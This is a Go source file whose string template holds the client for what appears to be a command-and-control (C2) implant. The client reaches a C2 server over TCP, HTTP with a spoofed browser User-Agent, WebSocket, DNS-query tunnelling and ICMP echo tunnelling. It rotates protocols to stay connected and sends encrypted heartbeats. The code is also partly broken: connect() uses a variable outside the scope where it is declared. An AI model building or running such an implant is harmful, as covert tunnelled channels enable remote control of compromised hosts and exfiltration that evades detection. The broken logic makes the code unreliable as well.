package main

// ClientTemplate is the template for the client code
const ClientTemplate = `package main

import (
	"bytes"
	"context"
	"encoding/base32"
	"encoding/binary"
	"flag"
	"fmt"
	"hash/crc32"
	"io"
	"io/ioutil"
	"log"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"strings"
	"sync"
	"syscall"
	"time"
	
	"github.com/gorilla/websocket"
	"golang.org/x/net/icmp"
	"golang.org/x/net/ipv4"
	
	"client/pkg/crypto"
	"client/pkg/protocol"
)

var (
	serverAddr      string
	protocolList    string
	currentProtocol string
	encryptor       crypto.Encryptor
	protocolHandler *protocol.ProtocolHandler
	sessionID       crypto.SessionID
	connMutex       sync.Mutex
	isConnected     bool
	lastHeartbeat   time.Time
	tcpConn         net.Conn // Add this line to store the TCP connection
)

func main() {
	// Parse command line flags
	flag.StringVar(&serverAddr, "server", BuildConfig.ServerAddr, "C2 server address")
	flag.StringVar(&protocolList, "protocol", strings.Join(BuildConfig.Protocols, ","), "Comma-separated list of protocols to use")
	flag.Parse()

	if serverAddr == "" {
		fmt.Println("Error: Server address is required")
		flag.Usage()
		os.Exit(1)
	}

	// Parse protocol list
	protocols := strings.Split(protocolList, ",")
	if len(protocols) == 0 {
		fmt.Println("Error: At least one valid protocol must be specified")
		flag.Usage()
		os.Exit(1)
	}

	// Generate a session ID
	sessionID = crypto.GenerateSessionID()
	
	// Create protocol handler
	protocolHandler = protocol.NewProtocolHandler()
	
	// Initialize encryption
	var err error
	var algorithm crypto.Algorithm
	
	if BuildConfig.EncryptionAlg == "aes" {
		algorithm = crypto.AlgorithmAES
		encryptor, err = crypto.NewAESEncryptor()
	} else if BuildConfig.EncryptionAlg == "chacha20" {
		algorithm = crypto.AlgorithmChacha20
		encryptor, err = crypto.NewChacha20Encryptor()
	} else {
		log.Fatalf("Unsupported encryption algorithm: %s", BuildConfig.EncryptionAlg)
	}
	
	if err != nil {
		log.Fatalf("Failed to initialize encryption: %v", err)
	}
	
	// Create encryption session
	err = protocolHandler.CreateSession(sessionID, algorithm)
	if err != nil {
		log.Fatalf("Failed to create encryption session: %v", err)
	}
	
	// Setup signal handling for graceful shutdown
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)

	// Start with the first protocol
	currentProtocol = protocols[0]
	
	// Connect to server
	if err := connect(currentProtocol, serverAddr); err != nil {
		log.Printf("Failed to connect with protocol %s: %v", currentProtocol, err)
		
		// Try other protocols if available
		if len(protocols) > 1 && BuildConfig.ActiveSwitching {
			for i := 1; i < len(protocols); i++ {
				currentProtocol = protocols[i]
				if err := connect(currentProtocol, serverAddr); err == nil {
					break
				}
				log.Printf("Failed to connect with protocol %s: %v", currentProtocol, err)
			}
		}
	}
	
	if !isConnected {
		log.Fatalf("Failed to connect to server with any protocol")
	}

	// Start heartbeat
	go sendHeartbeats()
	
	// Start protocol switching monitor if active switching is enabled
	if BuildConfig.ActiveSwitching && len(protocols) > 1 {
		go monitorConnection(protocols)
	}

	// Wait for termination signal
	<-sigChan
	fmt.Println("\nShutting down client...")
	
	// Perform clean shutdown
	disconnect()
	
	fmt.Println("Client shutdown complete.")
}

// SendPacket sends a packet to the server
func SendPacket(packet *protocol.Packet) error {
	if !isConnected || tcpConn == nil {
		return fmt.Errorf("not connected")
	}
	
	// Prepare the packet for sending
	fragments, err := protocolHandler.PrepareOutgoingPacket(packet, sessionID, true)
	if err != nil {
		return fmt.Errorf("failed to prepare packet: %w", err)
	}
	
	// Send each fragment
	for _, fragment := range fragments {
		// Send the fragment
		_, err = tcpConn.Write(fragment)
		if err != nil {
			return fmt.Errorf("failed to send fragment: %w", err)
		}
	}
	
	return nil
}

// connectICMP establishes an ICMP connection to the server
func connectICMP(address string) error {
	log.Printf("Connecting to %s using protocol icmp", address)
	
	// Resolve server IP
	ips, err := net.LookupIP(address)
	if err != nil {
		return fmt.Errorf("failed to resolve server address: %w", err)
	}
	
	// Find IPv4 address
	var serverIP net.IP
	for _, ip := range ips {
		if ip.To4() != nil {
			serverIP = ip
			break
		}
	}
	
	if serverIP == nil {
		return fmt.Errorf("no IPv4 address found for server")
	}
	
	// Open ICMP connection
	conn, err := icmp.ListenPacket("ip4:icmp", "0.0.0.0")
	if err != nil {
		return fmt.Errorf("failed to listen for ICMP packets: %w", err)
	}
	
	// Create a key exchange packet with the session ID as data
	keyExchangePacket := protocol.NewPacket(protocol.PacketTypeKeyExchange, []byte(string(sessionID)))
	
	// Prepare the packet for sending
	fragments, err := protocolHandler.PrepareOutgoingPacket(keyExchangePacket, sessionID, false)
	if err != nil {
		conn.Close()
		return fmt.Errorf("failed to prepare packet: %w", err)
	}
	
	// Send each fragment as a separate ICMP echo request
	sequenceID := 1
	for _, fragment := range fragments {
		// Create ICMP message
		msg := icmp.Message{
			Type: ipv4.ICMPTypeEcho,
			Code: 0,
			Body: &icmp.Echo{
				ID:   os.Getpid() & 0xffff,
				Seq:  sequenceID,
				Data: fragment,
			},
		}
		sequenceID++
		
		// Marshal message
		msgBytes, err := msg.Marshal(nil)
		if err != nil {
			conn.Close()
			return fmt.Errorf("failed to marshal ICMP message: %w", err)
		}
		
		// Send message
		_, err = conn.WriteTo(msgBytes, &net.IPAddr{IP: serverIP})
		if err != nil {
			conn.Close()
			return fmt.Errorf("failed to send ICMP message: %w", err)
		}
	}
	
	// Update connection state
	isConnected = true
	
	return nil
}

// connectDNS establishes a DNS connection to the server
func connectDNS(address string) error {
	log.Printf("Connecting to %s using protocol dns", address)
	
	// Extract domain base from server address
	domainBase := address
	if domainBase == "" {
		domainBase = "c2.example.com"
	}
	
	// Create custom resolver
	resolver := &net.Resolver{
		PreferGo: true,
		Dial: func(ctx context.Context, network, address string) (net.Conn, error) {
			d := net.Dialer{
				Timeout: 10 * time.Second,
			}
			return d.DialContext(ctx, "udp", address)
		},
	}
	
	// Test DNS resolution
	_, err := resolver.LookupHost(context.Background(), domainBase)
	if err != nil {
		return fmt.Errorf("failed to resolve domain: %w", err)
	}
	
	// Create a key exchange packet with the session ID as data
	keyExchangePacket := protocol.NewPacket(protocol.PacketTypeKeyExchange, []byte(string(sessionID)))
	
	// Prepare the packet for sending
	fragments, err := protocolHandler.PrepareOutgoingPacket(keyExchangePacket, sessionID, false)
	if err != nil {
		return fmt.Errorf("failed to prepare packet: %w", err)
	}
	
	// Send each fragment as a separate DNS query
	for i, fragment := range fragments {
		// Encode fragment as DNS query
		encodedData := base32.StdEncoding.EncodeToString(fragment)
		
		// Split into DNS-like segments (max 63 chars per label)
		var segments []string
		for j := 0; j < len(encodedData); j += 63 {
			end := j + 63
			if end > len(encodedData) {
				end = len(encodedData)
			}
			segments = append(segments, encodedData[j:end])
		}
		
		// Create DNS query domain
		queryDomain := fmt.Sprintf("%s.%d.%s.%s", 
			strings.Join(segments, "."),
			i,
			string(sessionID)[:8],
			domainBase)
		
		// Send DNS query
		_, err := resolver.LookupHost(context.Background(), queryDomain)
		if err != nil {
			// DNS errors are expected, as we're using DNS for data transport
		}
	}
	
	// Update connection state
	isConnected = true
	
	return nil
}

// connectWebSocket establishes a WebSocket connection to the server
func connectWebSocket(address string) error {
	log.Printf("Connecting to %s using protocol websocket", address)
	
	// Parse server address
	u, err := url.Parse("ws://" + address)
	if err != nil {
		return fmt.Errorf("invalid server address: %w", err)
	}
	
	// Add session ID to URL
	q := u.Query()
	q.Set("session", string(sessionID))
	u.RawQuery = q.Encode()
	
	// Connect to WebSocket server
	dialer := websocket.Dialer{
		HandshakeTimeout: 10 * time.Second,
	}
	conn, _, err := dialer.Dial(u.String(), nil)
	if err != nil {
		return fmt.Errorf("failed to connect to server: %w", err)
	}
	
	// Create a key exchange packet with the session ID as data
	keyExchangePacket := protocol.NewPacket(protocol.PacketTypeKeyExchange, []byte(string(sessionID)))
	
	// Prepare the packet for sending
	fragments, err := protocolHandler.PrepareOutgoingPacket(keyExchangePacket, sessionID, false)
	if err != nil {
		conn.Close()
		return fmt.Errorf("failed to prepare packet: %w", err)
	}
	
	// Send each fragment
	for _, fragment := range fragments {
		err := conn.WriteMessage(websocket.BinaryMessage, fragment)
		if err != nil {
			conn.Close()
			return fmt.Errorf("failed to send message: %w", err)
		}
	}
	
	// Wait for response
	for i := 0; i < 5; i++ {
		// Set read deadline
		err := conn.SetReadDeadline(time.Now().Add(2 * time.Second))
		if err != nil {
			conn.Close()
			return fmt.Errorf("failed to set read deadline: %w", err)
		}
		
		// Read message
		messageType, data, err := conn.ReadMessage()
		if err != nil {
			if i == 4 {
				conn.Close()
				return fmt.Errorf("handshake timed out")
			}
			time.Sleep(500 * time.Millisecond)
			continue
		}
		
		// Verify message type
		if messageType != websocket.BinaryMessage {
			conn.Close()
			return fmt.Errorf("unexpected message type: %d", messageType)
		}
		
		// Process the packet
		packet, err := protocolHandler.ProcessIncomingPacket(data, sessionID)
		if err != nil {
			// If waiting for more fragments, continue
			if err.Error() == "packet fragmented, waiting for more fragments" {
				continue
			}
			conn.Close()
			return fmt.Errorf("failed to process packet: %w", err)
		}
		
		// Verify response
		if packet.Header.Type != protocol.PacketTypeKeyExchange {
			conn.Close()
			return fmt.Errorf("unexpected response type: %d", packet.Header.Type)
		}
		
		// Handshake successful
		break
	}
	
	// Update connection state
	isConnected = true
	
	return nil
}

// connectHTTP establishes an HTTP connection to the server
func connectHTTP(address string) error {
	log.Printf("Connecting to %s using protocol http", address)
	
	// Create HTTP client
	client := &http.Client{
		Timeout: 30 * time.Second,
		Transport: &http.Transport{
			MaxIdleConns:        10,
			IdleConnTimeout:     90 * time.Second,
			TLSHandshakeTimeout: 10 * time.Second,
			DisableCompression:  true,
		},
	}
	
	// Create a test request to verify server is reachable
	req, err := http.NewRequest("GET", "http://"+address, nil)
	if err != nil {
		return fmt.Errorf("failed to create request: %w", err)
	}
	
	// Set headers
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36")
	req.Header.Set("Connection", "keep-alive")
	
	// Send request
	resp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf("failed to connect to server: %w", err)
	}
	defer resp.Body.Close()
	
	// Create a key exchange packet with the session ID as data
	keyExchangePacket := protocol.NewPacket(protocol.PacketTypeKeyExchange, []byte(string(sessionID)))
	
	// Prepare the packet for sending
	fragments, err := protocolHandler.PrepareOutgoingPacket(keyExchangePacket, sessionID, false)
	if err != nil {
		return fmt.Errorf("failed to prepare packet: %w", err)
	}
	
	// Send each fragment as a separate HTTP request
	for _, fragment := range fragments {
		// Create HTTP request
		req, err := http.NewRequest("POST", "http://"+address+"/data", bytes.NewReader(fragment))
		if err != nil {
			return fmt.Errorf("failed to create request: %w", err)
		}
		
		// Set headers
		req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36")
		req.Header.Set("Content-Type", "application/octet-stream")
		req.Header.Set("X-Session-ID", string(sessionID))
		
		// Send request
		resp, err := client.Do(req)
		if err != nil {
			return fmt.Errorf("failed to send request: %w", err)
		}
		defer resp.Body.Close()
		
		// Check response status
		if resp.StatusCode != http.StatusOK {
			return fmt.Errorf("unexpected status code: %d", resp.StatusCode)
		}
	}
	
	// Update connection state
	isConnected = true
	
	return nil
}

func connect(protocol, address string) error {
	connMutex.Lock()
	defer connMutex.Unlock()
	
	// Implementation would connect using the specified protocol
	log.Printf("Connecting to %s using protocol %s", address, protocol)
	
	// Connect to the server using the specified protocol
	switch protocol {
	case "tcp":
		// Establish TCP connection
		conn, err := net.DialTimeout("tcp", address, 10*time.Second)
		if err != nil {
			log.Printf("Failed to connect to server: %v", err)
			return err
		}
		tcpConn = conn
	case "http":
		err := connectHTTP(address)
		if err != nil {
			log.Printf("Failed to connect with HTTP: %v", err)
			return err
		}
		return nil
	case "websocket":
		err := connectWebSocket(address)
		if err != nil {
			log.Printf("Failed to connect with WebSocket: %v", err)
			return err
		}
		return nil
	case "dns":
		err := connectDNS(address)
		if err != nil {
			log.Printf("Failed to connect with DNS: %v", err)
			return err
		}
		return nil
	case "icmp":
		err := connectICMP(address)
		if err != nil {
			log.Printf("Failed to connect with ICMP: %v", err)
			return err
		}
		return nil
	default:
		return fmt.Errorf("unsupported protocol: %s", protocol)
	}
	
	// Store the connection for later use
	tcpConn = conn
	
	// Create a key exchange packet with the session ID as data
	keyExchangePacket := createPacket(6, []byte(string(sessionID))) // 6 = PacketTypeKeyExchange
	
	// Send the packet
	err = SendPacket(keyExchangePacket)
	if err != nil {
		log.Printf("Failed to send key exchange packet: %v", err)
		conn.Close()
		tcpConn = nil
		return err
	}
	
	log.Printf("Sent key exchange packet to server")
	
	// Store the connection for later use
	tcpConn = conn
	
	// Wait for response
	for i := 0; i < 5; i++ {
		// Receive response
		response, err := ReceivePacket()
		if err != nil {
			log.Printf("Failed to receive response: %v", err)
			conn.Close()
			tcpConn = nil
			return err
		}
		
		if response != nil && response.Header.Type == protocol.PacketTypeKeyExchange {
			// Handshake successful
			log.Printf("Received key exchange response from server")
			break
		}
		
		time.Sleep(500 * time.Millisecond)
	}
	
	log.Printf("Received response from server")
	
	// Store the connection for later use
	tcpConn = conn
	
	// Update connection state
	isConnected = true
	lastHeartbeat = time.Now()
	
	log.Printf("Connected to server: %s using protocol: %s with encryption: %s", 
		address, protocol, BuildConfig.EncryptionAlg)
	return nil
}

func disconnect() {
	connMutex.Lock()
	defer connMutex.Unlock()
	
	if !isConnected {
		return
	}
	
	// Close the TCP connection if it exists
	if tcpConn != nil {
		log.Println("Closing TCP connection")
		tcpConn.Close()
		tcpConn = nil
	}
	
	log.Println("Disconnected from server")
	
	// Update connection state
	isConnected = false
}

// ReceivePacket receives a packet from the server
func ReceivePacket() (*protocol.Packet, error) {
	if !isConnected || tcpConn == nil {
		return nil, fmt.Errorf("not connected")
	}
	
	// Set read deadline
	err := tcpConn.SetReadDeadline(time.Now().Add(100 * time.Millisecond))
	if err != nil {
		return nil, fmt.Errorf("failed to set read deadline: %w", err)
	}
	
	// Read data
	buffer := make([]byte, 4096)
	n, err := tcpConn.Read(buffer)
	if err != nil {
		// If timeout, return nil without error
		if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
			return nil, nil
		}
		return nil, fmt.Errorf("failed to read data: %w", err)
	}
	
	// Process the packet
	packet, err := protocolHandler.ProcessIncomingPacket(buffer[:n], sessionID)
	if err != nil {
		// If waiting for more fragments, just return nil
		if err.Error() == "packet fragmented, waiting for more fragments" {
			return nil, nil
		}
		return nil, fmt.Errorf("failed to process packet: %w", err)
	}
	
	return packet, nil
}

func sendHeartbeats() {
	for {
		time.Sleep(time.Duration(BuildConfig.HeartbeatInterval) * time.Second)
		
		connMutex.Lock()
		if !isConnected {
			connMutex.Unlock()
			continue
		}
		
	// Create heartbeat packet
	heartbeatPacket := createPacket(0, []byte("heartbeat")) // 0 = PacketTypeHeartbeat
	
	// Send the packet using SendPacket
	err := SendPacket(heartbeatPacket)
	if err != nil {
		log.Printf("Failed to send heartbeat: %v", err)
		connMutex.Unlock()
		continue
	}
	
	log.Println("Sent heartbeat with encryption algorithm:", BuildConfig.EncryptionAlg)
		
		// Update last heartbeat time
		lastHeartbeat = time.Now()
		connMutex.Unlock()
	}
}

func monitorConnection(protocols []string) {
	currentProtocolIndex := 0
	for i, p := range protocols {
		if p == currentProtocol {
			currentProtocolIndex = i
			break
		}
	}
	
	for {
		time.Sleep(5 * time.Second)
		
		connMutex.Lock()
		if !isConnected || time.Since(lastHeartbeat) > time.Duration(BuildConfig.HeartbeatInterval*3)*time.Second {
			// Connection lost or heartbeat timeout, try next protocol
			nextIndex := (currentProtocolIndex + 1) % len(protocols)
			nextProtocol := protocols[nextIndex]
			
			log.Printf("Switching from protocol %s to %s", currentProtocol, nextProtocol)
			
			// Disconnect if still connected
			if isConnected {
				// Implementation would disconnect
				isConnected = false
			}
			
			connMutex.Unlock()
			
			// Try to connect with next protocol
			if err := connect(nextProtocol, serverAddr); err != nil {
				log.Printf("Failed to connect with protocol %s: %v", nextProtocol, err)
			} else {
				currentProtocol = nextProtocol
				currentProtocolIndex = nextIndex
			}
		} else {
			connMutex.Unlock()
		}
	}
}

// createPacket creates a new packet with the specified type and data
func createPacket(packetType uint8, data []byte) *protocol.Packet {
	// Create a new packet with the specified type and data
	packet := &protocol.Packet{
		Header: protocol.PacketHeader{
			Version:      1, // Protocol version (must match ProtocolVersion in server)
			EncAlgorithm: 0, // No encryption for initial packet
			Type:         protocol.PacketType(packetType),
			TaskID:       0, // Will be set by the task manager
			Checksum:     0, // Will be calculated during encoding
		},
		Data: data,
	}
	
	return packet
}




// encryptPacket encodes and encrypts a packet using the current encryptor
func encryptPacket(packet *protocol.Packet) ([]byte, error) {
	// Set encryption algorithm based on BuildConfig
	if BuildConfig.EncryptionAlg == "aes" {
		packet.Header.EncAlgorithm = 1 // EncryptionAlgorithmAES = 1
	} else if BuildConfig.EncryptionAlg == "chacha20" {
		packet.Header.EncAlgorithm = 2 // EncryptionAlgorithmChacha20 = 2
	} else {
		packet.Header.EncAlgorithm = 0 // EncryptionAlgorithmNone = 0
	}
	
	// For key exchange packets, always use no encryption
	if packet.Header.Type == 6 { // PacketTypeKeyExchange
		packet.Header.EncAlgorithm = 0 // EncryptionAlgorithmNone = 0
		
		// Encode the packet (this will calculate the checksum)
		encodedPacket := encodePacket(packet)
		return encodedPacket, nil
	}
	
	// For other packets, encode first, then encrypt
	encodedPacket := encodePacket(packet)
	
	// Encrypt the encoded packet
	encrypted, err := encryptor.Encrypt(encodedPacket)
	if err != nil {
		return nil, err
	}
	
	return encrypted, nil
}

// encodePacket encodes a packet into bytes with proper checksum
func encodePacket(p *protocol.Packet) []byte {
	buf := new(bytes.Buffer)
	
	// Reserve space for header
	headerBytes := make([]byte, 12) // HeaderSize = 12
	
	// Set header fields
	headerBytes[0] = p.Header.Version
	headerBytes[1] = byte(p.Header.EncAlgorithm)
	headerBytes[2] = byte(p.Header.Type)
	
	// Set TaskID (4 bytes)
	binary.BigEndian.PutUint32(headerBytes[3:7], p.Header.TaskID)
	
	// Reserve space for checksum (4 bytes)
	// Will be calculated after writing data
	
	// Write header to buffer
	buf.Write(headerBytes)
	
	// Write data to buffer
	buf.Write(p.Data)
	
	// Get the full packet bytes
	packetBytes := buf.Bytes()
	
	// Calculate checksum (excluding the checksum field itself)
	// Create a copy with zero checksum for calculation
	checksumData := make([]byte, len(packetBytes))
	copy(checksumData, packetBytes)
	
	// Zero out the checksum field in the copy
	binary.BigEndian.PutUint32(checksumData[7:11], 0)
	
	// Calculate checksum
	checksum := crc32.ChecksumIEEE(checksumData)
	
	// Set checksum in the original packet bytes
	binary.BigEndian.PutUint32(packetBytes[7:11], checksum)
	
	return packetBytes
}
`
